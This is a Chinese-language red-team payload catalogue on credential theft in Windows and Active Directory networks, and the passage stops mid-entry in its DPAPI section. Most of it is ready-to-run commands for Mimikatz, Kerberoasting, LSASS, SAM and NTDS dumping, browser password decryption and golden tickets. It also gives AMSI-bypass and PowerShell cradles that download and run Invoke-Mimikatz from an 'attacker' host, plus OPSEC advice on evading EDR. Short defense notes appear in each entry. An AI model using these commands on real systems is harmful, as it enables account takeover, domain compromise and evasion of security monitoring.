# 凭证窃取

_23 条 intranet payload_

### Mimikatz凭证抓取  `mimikatz-creds`
_使用Mimikatz抓取Windows系统凭证_
子类：**Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`

**前置条件：**
- 需要管理员权限
- 需要绕过杀毒软件
- Windows系统

**攻击链：**

**抓取所有凭证**
> 抓取LSASS中的所有登录凭证
_platform: windows_
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
**语法解析：**
- `privilege::debug` — 获取Debug权限，需要管理员权限 _command_
- `sekurlsa::logonpasswords` — 从LSASS导出所有登录凭证 _command_
- `exit` — 执行完毕后退出 _command_

**导出LSASS**
> 从LSASS转储文件中提取凭证
_platform: windows_
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**Pass-the-Hash**
> 使用NTLM哈希进行Pass-the-Hash攻击
_platform: windows_
```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

**DCSync攻击**
> 模拟DC同步获取域内所有用户哈希
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```
**语法解析：**
- `lsadump::dcsync` — DCSync命令，模拟域控制器复制 _command_
- `/domain:` — 目标域名 _parameter_
- `/user:` — 要同步的用户 _parameter_

**导出所有哈希**
> 从LSA导出所有用户哈希
_platform: windows_
```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

**黄金票据**
> 生成黄金票据获取域管理员权限
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```
**语法解析：**
- `kerberos::golden` — 生成黄金票据命令 _command_
- `/sid:` — 域SID _parameter_
- `/krbtgt:` — krbtgt账户的NTLM哈希 _parameter_

**白银票据**
> 生成白银票据访问特定服务
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

**EDR 绕过变体：**

**PowerShell加载**
> 通过PowerShell远程加载Mimikatz
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

**AMSI绕过**
> 禁用AMSI后加载Mimikatz
```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
```

**混淆执行**
> 通过反射绕过AMSI
```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
```


**分析：** 成功执行后可获取明文密码、NTLM哈希、Kerberos票据等凭证信息。

**OPSEC 提示：**
- Mimikatz会被大多数杀软检测
- 使用混淆或内存加载绕过检测
- 优先考虑使用其他更隐蔽的工具
- 操作LSASS会触发EDR告警

**概述：** Mimikatz是一款强大的Windows安全测试工具，可以从内存中提取明文密码、哈希、Kerberos票据等凭证信息。

**漏洞原理：** Windows系统将用户凭证存储在LSASS进程内存中，Mimikatz可以直接读取这些凭证。这是Windows认证机制的设计特性。

**利用方法：** 利用流程：1) 获取管理员权限；2) 绕过杀毒软件；3) 执行Mimikatz抓取凭证；4) 使用凭证进行横向移动；5) 提升到域管理员权限。

**防御措施：** 防御措施：1) 启用Credential Guard；2) 限制管理员权限；3) 监控LSASS访问；4) 部署EDR解决方案；5) 定期更改密码。

---

### Kerberoasting攻击  `kerberoasting`
_Kerberoasting攻击获取服务账户哈希_
子类：**Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`

**前置条件：**
- 域环境
- 任意域用户凭证
- 域内存在SPN账户

**攻击链：**

**发现SPN**
> 查询域内所有SPN
_platform: windows_
```
setspn -T domain.com -Q */*
```

**请求服务票据**
> PowerShell请求Kerberos票据
_platform: windows_
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

**导出票据**
> 使用Mimikatz导出Kerberos票据
_platform: windows_
```
mimikatz.exe "kerberos::list /export" "exit"
```

**Rubeus请求**
> 使用Rubeus进行Kerberoasting
_platform: windows_
```
Rubeus.exe kerberoast /stats
```
**语法解析：**
- `Rubeus.exe` — Kerberos攻击工具 _command_
- `kerberoast` — Kerberoasting模块 _command_
- `/stats` — 显示统计信息 _parameter_

**Impacket GetUserSPNs**
> 使用Impacket获取服务票据
_platform: linux_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```
**语法解析：**
- `GetUserSPNs.py` — Impacket Kerberoasting工具 _command_
- `-request` — 请求服务票据 _parameter_

**离线破解**
> 使用Hashcat破解Kerberos票据
_platform: linux_
```
hashcat -m 13100 kerberoast.hash wordlist.txt
```
**语法解析：**
- `-m 13100` — Kerberos 5 TGS-REP模式 _parameter_

**EDR 绕过变体：**

**RC4加密**
> 使用RC4加密，避免触发告警
```
Rubeus.exe kerberoast /rc4opsec
```


**分析：** Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。

**OPSEC 提示：**
- Kerberoasting不需要高权限
- 只需要任意域用户凭证
- 建议使用RC4加密避免检测

**概述：** Kerberoasting是一种针对Kerberos协议的攻击，攻击者可以请求服务票据并离线破解服务账户密码。

**漏洞原理：** Kerberos服务票据使用服务账户密码加密，攻击者可以请求票据后离线破解。服务账户通常密码复杂度较低。

**利用方法：** 利用流程：1) 获取任意域用户凭证；2) 查询域内SPN；3) 请求服务票据；4) 导出票据；5) 离线破解密码。

**防御措施：** 防御措施：1) 服务账户使用强密码；2) 监控异常的票据请求；3) 定期轮换服务账户密码；4) 部署蜜罐账户检测攻击。

---

### AS-REP Roasting  `asreproasting`
_AS-REP Roasting攻击获取用户哈希_
子类：**Kerberos** · tags: `asreproasting` `kerberos` `active-directory`

**前置条件：**
- 域环境
- 域中存在禁用Pre-auth的用户

**攻击链：**

**Rubeus攻击**
> 使用Rubeus进行AS-REP Roasting
_platform: windows_
```
Rubeus.exe asreproast
```

**Impacket攻击**
> 使用Impacket获取AS-REP
_platform: linux_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```
**语法解析：**
- `GetNPUsers.py` — Impacket AS-REP Roasting工具 _command_
- `-usersfile` — 用户列表文件 _parameter_
- `-format hashcat` — 输出hashcat格式 _parameter_

**查找禁用Pre-auth用户**
> 查找禁用Pre-auth的用户
_platform: windows_
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**破解哈希**
> 使用Hashcat破解AS-REP哈希
_platform: linux_
```
hashcat -m 18200 asrep.hash wordlist.txt
```
**语法解析：**
- `-m 18200` — Kerberos 5 AS-REP模式 _parameter_


**分析：** AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。

**OPSEC 提示：**
- 不需要任何凭证
- 只需要用户名
- 禁用Pre-auth是错误配置

**概述：** AS-REP Roasting是一种针对禁用Kerberos Pre-authentication用户的攻击。

**漏洞原理：** 禁用Pre-auth的用户可以直接获取AS-REP，其中包含可离线破解的哈希。

**利用方法：** 利用流程：1) 查找禁用Pre-auth的用户；2) 请求AS-REP；3) 提取哈希；4) 离线破解。

**防御措施：** 防御措施：1) 启用所有用户的Pre-auth；2) 监控异常的AS-REQ；3) 使用强密码。

---

### LaZagne凭证抓取  `lazagne-creds`
_使用LaZagne抓取各种应用程序凭证_
子类：**工具** · tags: `lazagne` `credentials` `browsers` `applications`

**前置条件：**
- 目标机器访问权限
- LaZagne工具

**攻击链：**

**抓取所有凭证**
> 抓取所有支持的凭证
_platform: windows_
```
laZagne.exe all
```
**语法解析：**
- `laZagne.exe` — LaZagne凭证抓取工具 _command_
- `all` — 抓取所有模块 _parameter_

**浏览器凭证**
> 抓取浏览器保存的密码
_platform: windows_
```
laZagne.exe browsers
```

**WiFi凭证**
> 抓取WiFi密码
_platform: windows_
```
laZagne.exe wifi
```

**邮件客户端**
> 抓取邮件客户端密码
_platform: windows_
```
laZagne.exe mails
```

**数据库凭证**
> 抓取数据库客户端密码
_platform: windows_
```
laZagne.exe databases
```

**Linux版本**
> Linux版本抓取
_platform: linux_
```
python laZagne.py all
```

**EDR 绕过变体：**

**混淆执行**
> Base64编码执行
```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```


**分析：** LaZagne可以从浏览器、邮件客户端、数据库客户端等多种应用程序中提取保存的凭证。

**OPSEC 提示：**
- LaZagne会被杀软检测
- 考虑使用混淆或内存加载
- 可以只运行特定模块

**概述：** LaZagne是一款开源的凭证抓取工具，支持从多种应用程序中提取保存的密码。

**漏洞原理：** 许多应用程序以不安全的方式存储用户凭证，LaZagne可以提取这些凭证。

**利用方法：** 利用流程：1) 获取目标机器访问权限；2) 运行LaZagne；3) 提取凭证；4) 使用凭证横向移动。

**防御措施：** 防御措施：1) 不在应用程序中保存密码；2) 使用密码管理器；3) 监控异常进程。

---

### SAM数据库导出  `sam-dump`
_导出Windows SAM数据库获取本地账户哈希_
子类：**SAM** · tags: `sam` `hash` `windows` `local`

**前置条件：**
- 管理员权限
- Windows系统

**攻击链：**

**reg导出**
> 导出SAM和SYSTEM配置单元
_platform: windows_
```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```
**语法解析：**
- `reg save` — 注册表导出命令 _command_
- `HKLM\SAM` — SAM配置单元路径 _value_
- `sam.hive` — 输出文件名 _value_

**Impacket解析**
> 使用Impacket解析SAM
_platform: linux_
```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```
**语法解析：**
- `secretsdump.py` — Impacket凭证转储工具 _command_
- `-sam` — SAM文件 _parameter_
- `-system` — SYSTEM文件 _parameter_

**Mimikatz导出**
> 使用Mimikatz导出SAM
_platform: windows_
```
mimikatz.exe "lsadump::sam" "exit"
```

**Volume Shadow Copy**
> 从卷影副本复制SAM
_platform: windows_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```


**分析：** SAM数据库包含本地账户的NTLM哈希，可以用于破解或Pass-the-Hash。

**OPSEC 提示：**
- 需要管理员权限
- 操作注册表可能触发告警
- 卷影副本方法更隐蔽

**概述：** SAM数据库存储Windows本地账户的密码哈希，可以导出后离线破解或用于Pass-the-Hash。

**漏洞原理：** SAM数据库可以被管理员访问，其中的哈希可以用于离线破解或Pass-the-Hash攻击。

**利用方法：** 利用流程：1) 获取管理员权限；2) 导出SAM和SYSTEM；3) 提取哈希；4) 破解或PtH。

**防御措施：** 防御措施：1) 禁用本地管理员账户；2) 使用强密码；3) 监控注册表访问。

---

### NTDS.dit导出  `ntds-dump`
_导出Active Directory数据库获取所有域用户哈希_
子类：**NTDS** · tags: `ntds` `active-directory` `hash` `domain`

**前置条件：**
- 域管理员权限
- 域控制器访问权限

**攻击链：**

**ntdsutil快照**
> 使用ntdsutil创建IFM快照
_platform: windows_
```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```
**语法解析：**
- `ntdsutil` — Active Directory数据库工具 _command_
- `activate instance ntds` — 激活NTDS实例 _command_
- `ifm` — Install From Media模式 _command_

**Volume Shadow Copy**
> 从卷影副本复制NTDS.dit
_platform: windows_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

**Impacket解析**
> 使用Impacket解析NTDS.dit
_platform: linux_
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Impacket远程转储**
> 远程转储域哈希
_platform: linux_
```
secretsdump.py domain/admin:password@dc_ip -just-dc
```
**语法解析：**
- `-just-dc` — 只转储域数据 _parameter_

**Mimikatz DCSync**
> 使用DCSync同步所有哈希
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```


**分析：** NTDS.dit包含域内所有用户的哈希，可以用于破解或Pass-the-Hash。

**OPSEC 提示：**
- 需要域管理员权限
- DCSync方法更隐蔽
- 操作可能触发大量告警

**概述：** NTDS.dit是Active Directory数据库，包含域内所有用户的密码哈希。

**漏洞原理：** 域管理员可以导出NTDS.dit或使用DCSync获取所有用户哈希。

**利用方法：** 利用流程：1) 获取域管理员权限；2) 导出NTDS.dit或使用DCSync；3) 提取所有哈希；4) 破解或PtH。

**防御措施：** 防御措施：1) 监控域管理员活动；2) 审计DCSync操作；3) 使用强密码。

---

### GPP密码提取  `gpp-password`
_提取组策略首选项中的密码_
子类：**GPP** · tags: `gpp` `group-policy` `password` `xml`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**查找GPP文件**
> 查找SYSVOL中的XML文件
_platform: linux_
```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

**PowerShell查找**
> PowerShell查找GPP文件
_platform: windows_
```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

**PowerView提取**
> 使用PowerView提取GPP密码
_platform: windows_
```
Get-NetGPPPassword
```

**gpp-decrypt**
> 解密GPP密码哈希
_platform: linux_
```
gpp-decrypt HASH
```
**语法解析：**
- `gpp-decrypt` — GPP密码解密工具 _command_

**Impacket提取**
> 使用Impacket提取GPP密码
_platform: linux_
```
Get-GPPPassword.py domain/user:password@dc_ip
```


**分析：** GPP密码使用公开的密钥加密，可以被解密获取明文密码。

**OPSEC 提示：**
- GPP密码是常见的信息泄露点
- 只需要普通域用户权限
- MS14-025修复后新密码不会被存储

**概述：** 组策略首选项(GPP)可以存储本地管理员密码，使用公开密钥加密，可以被解密。

**漏洞原理：** GPP使用公开的AES密钥加密密码，任何人都可以解密。

**利用方法：** 利用流程：1) 访问SYSVOL；2) 查找GPP XML文件；3) 提取cpassword；4) 解密密码。

**防御措施：** 防御措施：1) 安装MS14-025补丁；2) 删除现有的GPP密码；3) 使用LAPS管理本地管理员密码。

---

### Mimikatz高级技巧  `mimikatz-advanced`
_Mimikatz高级凭证提取和利用技术_
子类：**Mimikatz** · tags: `mimikatz` `credentials` `advanced`

**前置条件：**
- 管理员权限
- Mimikatz工具

**攻击链：**

**DCSync攻击**
> 模拟DC同步获取域管哈希
_platform: windows_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```
**语法解析：**
- `lsadump::dcsync` — DCSync模块，模拟域控制器复制 _command_
- `/domain:domain.com` — 目标域名 _parameter_
- `/user:Administrator` — 目标用户，获取其NTLM哈希 _parameter_

**黄金票据生成**
> 生成黄金票据并注入
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```
**语法解析：**
- `kerberos::golden` — 黄金票据模块 _command_
- `/sid:S-1-5-21-xxx` — 域SID _parameter_
- `/krbtgt:HASH` — krbtgt账户NTLM哈希 _parameter_
- `/ptt` — Pass-the-Ticket，直接注入内存 _parameter_

**白银票据生成**
> 生成白银票据访问特定服务
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```
**语法解析：**
- `/target:server` — 目标服务器 _parameter_
- `/service:cifs` — 服务类型，CIFS为文件共享 _parameter_
- `/rc4:HASH` — 服务账户NTLM哈希 _parameter_

**Skeleton Key植入**
> 植入万能密码mimikatz
_platform: windows_
```
privilege::debug
misc::skeleton
```
**语法解析：**
- `privilege::debug` — 获取Debug权限 _command_
- `misc::skeleton` — 植入Skeleton Key，密码为mimikatz _command_


**概述：** Mimikatz高级功能包括DCSync、黄金票据、白银票据等域持久化技术。

**漏洞原理：** 域控制器复制协议缺乏认证，Kerberos设计缺陷。

**利用方法：** 利用流程：1) 获取krbtgt哈希 2) 生成黄金票据 3) 持久化访问

**防御措施：** 防御措施：1) 监控DCSync行为 2) 定期更换krbtgt密码 3) 启用PAM

---

### LSASS 隐蔽转储  `lsass-dump-stealth`
_绕过 EDR/Credential Guard 的 LSASS dump 隐蔽链：comsvcs/nanodump/lsassy/Dumpert/pypykatz_
子类：**LSASS** · tags: `lsass` `minidump` `comsvcs` `nanodump` `lsassy` `dumpert` `pypykatz`

**前置条件：**
- 目标机 SYSTEM/管理员权限（dump 均需 SeDebugPrivilege）
- 已知 EDR/AV 存在（隐蔽链的价值即在规避）

**攻击链：**

**comsvcs.dll — rundll32 minidump（LOLBin，无落地工具）**
> 用系统自带 comsvcs.dll 导出 LSASS 内存快照
_platform: windows_
```
# 先定位 LSASS PID
tasklist | findstr /i lsass
powershell -c "Get-Process lsass | Select-Object -ExpandProperty Id"

# 用 rundll32 调 comsvcs 的 MiniDump 导出（PID 为 lsass 进程号）
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
```
**语法解析：**
- `comsvcs.dll, MiniDump` — 调系统 DLL 的 MiniDump 导出函数 _command_
- `<lsass_pid>` — 目标 LSASS 进程 ID _parameter_
- `full` — 完整内存转储（含凭证结构） _parameter_

**nanodump（SSP 规避 / 签名绕过 / 回传）**
> 高度规避的 LSASS dumper，支持 SSP 钩子与多通道回传
_platform: windows_
```
nanodump.exe --ssp --output C:\temp\lsass.dmp          # SSP 方式规避（绕过进程访问监控）
nanodump.exe --valid --output C:\temp\lsass.dmp         # 伪造签名
nanodump.exe --write C:\temp\lsass.dmp                  # 落盘
nanodump.exe --key <密钥> --write C:\temp\lsass.dmp      # 加密落盘，防静态扫描
```
**语法解析：**
- `--ssp` — 注册 Security Support Provider 触发 dump（规避直接 OpenProcess） _parameter_
- `--valid` — 用合法签名/合法进程伪装 _parameter_
- `--write` — 落盘；默认走命名管道回传，不落盘更隐蔽 _parameter_

**lsassy（远程 dumper + 输出解析）**
> 通过 WMI/SMB/远程注册表远程 dump LSASS 并本地解析，免落地
_platform: linux_
```
lsassy -u <user> -p <pass> -d <domain> <target>
lsassy -u <user> -H <NThash> -d <domain> <target>   # pass-the-hash 远程 dump
lsassy --users -u <user> -p <pass> -d <domain> <target>  # 只看用户哈希
```
**语法解析：**
- `-H` — 用 NTLM 哈希认证（PTH） _parameter_
- `--users` — 仅提取用户凭据（NT/LM 哈希） _parameter_
- 输出：表格化的 用户名/域名/NT 哈希/LM 哈希/登录类型 _command_

**Dumpert（API 级 dump + handlekatz 思路）**
> 用 API 直接 dump（NTDLL 调用），规避常见 minidump 特征
_platform: windows_
```
# Dumpert.exe 用 NtReadVirtualMemory 系 API 直读 LSASS，可配 handle 复制（handlekatz 思路）
Dumpert.exe
# 输出 lsass.dmp 到当前目录，再用 mimikatz/pypykatz 离线解析
```

**pypykatz 离线解析（minidump → 哈希/票据）**
> 把 dump 文件解析出哈希与 Kerberos 票据，全程离线（攻击机侧）
_platform: linux_
```
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp --json -o lsass.json   # JSON 输出便于程序化
```
**语法解析：**
- `lsa minidump` — 解析 LSASS minidump 的 LSA 结构 _command_
- `--json` — 结构化输出（MSV/Kerberos/WDigest/SSP 各 provider） _parameter_

**输出解读**：pypykatz/mimikatz 解析后按 provider 分组：
- `MSV` → NT/LM 哈希（用于 PTH）
- `Kerberos` → 票据与 aes256/rc4 密钥（用于 PTT/Overpass）
- `WDigest` → 明文口令（若未禁用 WDigest）
- `DPAPI` → 各用户 masterkey（衔接 dpapi-creds 链）

**检测避让对照**：
| 方式 | 规避点 | 残留痕迹 | 目标侧可检测信号 |
|---|---|---|---|
| comsvcs rundll32 | LOLBin、无落地 | 落盘 lsass.dmp | Sysmon Event 10（rundll32 访问 lsass）+ 文件创建 |
| nanodump --ssp | SSP 钩子绕 OpenProcess 监控 | 注册 SSP 项、命名管道 | Event 4624/4672 异常 + SSP 注册 |
| lsassy | 远程 dump、免落地 | 远程 WMI/SMB 调用 | 远程服务/注册表访问日志 |
| Dumpert | API 直读、改 handle | 落盘 dmp | LSASS 内存读取（ETW/Kernel 回调） |
| pypykatz | 全离线（攻击机） | 无目标侧痕迹 | 无（仅靠 dump 文件来源溯源） |

**概述：** 基础 LSASS dump（mimikatz 直接 `sekurlsa::logonpasswords`）最易被 EDR 拦截；隐蔽链通过 LOLBin/SSP 钩子/远程 dump/离线解析四类手段降低检出率，且能对抗部分 Credential Guard 场景（WDigest 禁用则无明文，但 NT 哈希与票据仍可用）。

**漏洞原理：** LSASS 进程在内存中持有明文/哈希/票据等凭证材料，任何具备 SeDebugPrivilege 的进程都能读取——安全产品靠「进程访问监控」兜底，隐蔽链正是绕这些监控。

**利用方法：** 1) 选 dump 方式（LOLBin/SSP/远程/API）2) 得到 minidump 3) pypykatz/mimikatz 离线解析 4) 哈希 PTH / 票据 PTT 横向。

**防御措施：** 1) 启用 Credential Guard（隔离 LSASS，防明文与哈希）2) 禁用 WDigest 3) LSA Protection（RunAsPPL，需 PPLdump 才能绕过）4) EDR 内核回调监控 LSASS 读访问 5) 监控 Sysmon Event 10 中非白名单进程访问 lsass。

---
### 浏览器凭证提取  `browser-creds`
_从浏览器中提取保存的密码和Cookie（全家族解密链）_
子类：**浏览器** · tags: `browser` `credentials` `chrome` `edge` `firefox` `dpapi` `nss` `app-bound`

**前置条件：**
- 目标用户会话内执行（或已获取用户密码/masterkey）
- 浏览器保存了密码/Cookie
- 浏览器进程已退出（SQLite 文件被锁定时的常见规避：复制到临时目录再解析）

**攻击链：**

**Chrome 密码解密链（DPAPI → AES-256-GCM v10）**
> Chrome 用 DPAPI 保护「加密密钥」，再用 AES-256-GCM(v10) 加密密码字段。全链三步：取 v10 key → DPAPI 解 key → AES-GCM 解密码
_platform: windows_
```
# 1) 定位数据文件
#   Login Data(密码) / Cookies(会话) / Local State(含 encrypted_key)
#   路径: %LOCALAPPDATA%\Google\Chrome\User Data\Default\
#   Local State 的 os_crypt.encrypted_key 用 DPAPI 保护，前缀 "DPAPI"

# 2) 提取 DPAPI 保护的 AES key（需先走 dpapi-creds 的 masterkey 链，或用同会话内工具）
#    Chrome <127: 直接 DPAPI 解 os_crypt.encrypted_key → AES key
#    Chrome 127+: 引入 App-Bound Encryption（见下「ABE 绕过」），key 另存于系统服务进程

# 3) 用 AES key 解 Login Data 的 password_value（v10 前缀; v80/v11 同理，算法同 AES-256-GCM）
```

**Chrome Cookie 提取**
> Cookie 的 encrypted_value 同样走上述链；拿到后可注入会话（见 lateral-movement）
_platform: windows_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "$env:TEMP\Cookies"
```

**Edge（同 DPAPI 但路径差异 + App-Bound Encryption）**
> Edge 数据路径与 Chrome 不同；127+ 版本用 App-Bound Encryption（见下）
_platform: windows_
```
# 路径: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\
# Login Data / Cookies / Local State 结构与 Chrome 一致（Chromium 内核）
# 差异点: Edge 的 App-Bound Encryption 依赖 "Microsoft Edge Elevation Service"（以 SYSTEM 运行）
```

**Firefox（logins.json + key4.db NSS，非 DPAPI）**
> Firefox 不用 DPAPI，用 NSS 库（key4.db 的加密项 + logins.json 的密文）
_platform: windows_
```
# 路径: %APPDATA%\Mozilla\Firefox\Profiles\xxxx.default-release\
# 关键文件: logins.json(密文) + key4.db(加密元数据) + key3.db(旧版本)

# firefox_decrypt（跨平台脚本，需目标机可用 python3）
python3 firefox_decrypt.py <profile目录>
```

**Opera / Brave / Vivaldi（Chromium 系，仅路径不同）**
_platform: windows_
```
# Opera:   %APPDATA%\Opera Software\Opera Stable\
# Brave:   %LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\
# Vivaldi: %LOCALAPPDATA%\Vivaldi\User Data\Default\
# 解密链同 Chrome（v10 AES-256-GCM + DPAPI）
```

**HackBrowserData（多浏览器批量）**
> 一键提取 Chrome/Edge/Firefox/Brave 等密码+Cookie+历史
_platform: windows_
```
hack-browser-data.exe -b all -gz -o C:\temp\results
hack-browser-data.exe -b chrome,edge,firefox -o C:\temp\results
```
**语法解析：**
- `-b all` — 提取所有支持的浏览器 _parameter_
- `-gz` — 结果 gzip 压缩打包 _parameter_
- `-o` — 输出目录 _parameter_

**SharpWeb（.NET 提取器）**
> 提取 Chrome/Edge/登录态，支持 masterkey 内联解密
_platform: windows_
```
SharpWeb.exe chrome
SharpWeb.exe edge
```

**App-Bound Encryption（Chrome 127+/Edge）绕过现状（2024-2025）**
> Chrome 127+ 把 AES key 从 Local State 移到 SYSTEM 服务进程，DPAPI 不再直接可解
_platform: windows_
```
# 机制: Chrome 用 "App-Bound Encryption"（绑定应用的加密），key 托管在
#   Google Chrome Elevation Service（SYSTEM 运行），普通用户态无法直接取 key
# 现状（截至 2025-2026）:
#   - 早期 PoC: 注入/调用 Chrome Elevation Service 的 COM 接口取 key
#   - 后续: Chrome 增加接口访问限制，公开 PoC 时效性短、需随版本适配
#   - 实战替代: 仍可通过「注入浏览器进程内存」或「在浏览器会话内调用其解密接口」取明文
# 结论: ABE 提高了门槛，但未封死——攻击者转向进程注入/反射调用，工具需持续更新
```

**输出解读**：HackBrowserData/SharpWeb 输出 `Login Data` 明文 URL+用户名+密码三元组；Firefox 输出 hostname+username+password；Cookie 输出为「域名 + name + value + 过期时间」，可注入到浏览器会话（Cookie 劫持）。

**证据要求**：浏览器类型 + 命中条目数 + 掩码样本（域名/用户名可见，密码值掩码）；完整库不落地。

**概述：** 浏览器保存的密码/Cookie 是横向与「会话接管」的高价值凭证面。Chrome/Edge 系走 DPAPI→AES-256-GCM，Firefox 走 NSS，解密链差异决定工具选择。

**漏洞原理：** 浏览器本地凭证依赖「登录用户上下文」的 DPAPI/NSS 保护——同一用户会话内即可解密；ABE 仅抬高门槛未消除风险。

**利用方法：** 1) 定位数据文件（各浏览器路径表）2) 判定加密机制（Chromium=DPAPI+AES-GCM / Firefox=NSS）3) 用 HackBrowserData/SharpWeb/firefox_decrypt 解密 4) 密码用于喷洒/横向，Cookie 用于会话劫持。

**防御措施：** 1) 不保存高价值口令 2) 启用浏览器主密码/同步加密 3) 监控 Login Data/Cookies/key4.db 的非浏览器进程访问（EDR 文件访问遥测）4) 敏感会话 Cookie 加 HttpOnly+设备绑定。

---

### DPAPI凭证提取  `dpapi-creds`
_DPAPI 全链解密：masterkey 定位 → 三路径分叉 → 域备份密钥 → 离线工具链 → 域内横向_
子类：**DPAPI** · tags: `dpapi` `credentials` `windows` `masterkey` `dcsync` `sharpdpapi` `donpapi` `pypykatz`

**前置条件：**
- 用户权限（本地解密）或域管/DCSync 权限（域备份密钥路径）
- 能读 DPAPI blob 文件（`%APPDATA%\Microsoft\Credentials` / `%LOCALAPPDATA%\Microsoft\Credentials`）

**攻击链：**

**① masterkey 文件定位**
> DPAPI 主密钥按用户 SID 分目录存放
_platform: windows_
```
# 用户 masterkey 目录（每个 SID 一个子目录，内含首选 key 文件 = GUID 名）
dir "%APPDATA%\Microsoft\Protect\" /s
dir "%SYSTEMDRIVE%\Users\<user>\AppData\Roaming\Microsoft\Protect\S-1-5-21-*\"
# masterkey 文件名形如 <GUID>（首选密钥），含 Preferred 元数据在 Preferred 文件
```
**语法解析：**
- `S-1-5-21-*` — 域用户 SID 前缀（本地用户为 `S-1-5-21` 也可） _value_

**② masterkey 三种解密路径分叉**
_platform: windows_
```
# 路径A: 用户口令已知 → 用口令派生 masterkey（DPAPI 用 SHA1 派生用户密钥）
#   mimikatz:
dpapi::masterkey /in:<masterkey文件> /sid:<用户SID> /password:<明文口令>

# 路径B: 域环境 → 用「SID + 域备份密钥(DPAPI backup key)」解密任意用户 masterkey
#   域备份密钥 = domain DPAPI backup key（BCK / BACKUPKEY，全域共用）
dpapi::masterkey /in:<masterkey文件> /sid:<SID> /domain:<域名> /pvk:<backupkey.pvk>

# 路径C: 已在用户会话内 → 直接抓内存中的 masterkey（免口令）
sekurlsa::dpapi
```
**语法解析：**
- `dpapi::masterkey` — mimikatz masterkey 解密命令 _command_
- `/pvk` — 域备份密钥（私钥）文件，来自 DCSync 的 `backupkey` _parameter_

**③ 域备份密钥提取（DCSync backupkey / ntdsutil）**
> 域备份密钥可解「全域任意用户」的 DPAPI blob——横向解密的关键
_platform: windows_
```
# Impacket secretsdump 提取 DPAPI backup key（需域管/DCSync 权限）
secretsdump.py -just-dc <domain>/<admin>@<DC_IP> -outputfile dcsync

# 从 ntds.dit 提取（离线，需 SYSTEM 或 VSS）
#   ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
#   → 用 secretsdump -ntds 处理，输出中包含 DPAPI_SYSTEM（backupkey 私钥）

# 提取出的 BACKUPKEY 结构: PVK 私钥 + 证书，喂给 dpapi::masterkey /pvk 或 DonPAPI
```

**④ credential blob 结构与解密**
_platform: windows_
```
# 凭据文件（Credential Manager）:
#   %APPDATA%\Microsoft\Credentials\   (域凭据)
#   %LOCALAPPDATA%\Microsoft\Credentials\ (本地/App 凭据)
# blob = 固定头 + masterkey GUID + DPAPI 密文（CREDENTIAL_BLOB）
# 解密时用对应 masterkey 解 blob → 得到 CREDENTIAL 结构（用户名/密码/目标）
dpapi::cred /in:"%APPDATA%\Microsoft\Credentials\<GUID>" /masterkey:<mk>
```

**⑤ 离线工具链（命令 + 输出解读）**

**SharpDPAPI（Windows，域内单机/批量）**
_platform: windows_
```
SharpDPAPI.exe credentials        # 枚举+解密 Credential Manager
SharpDPAPI.exe masterkeys         # 枚举+解密 masterkey（需域备份密钥或口令）
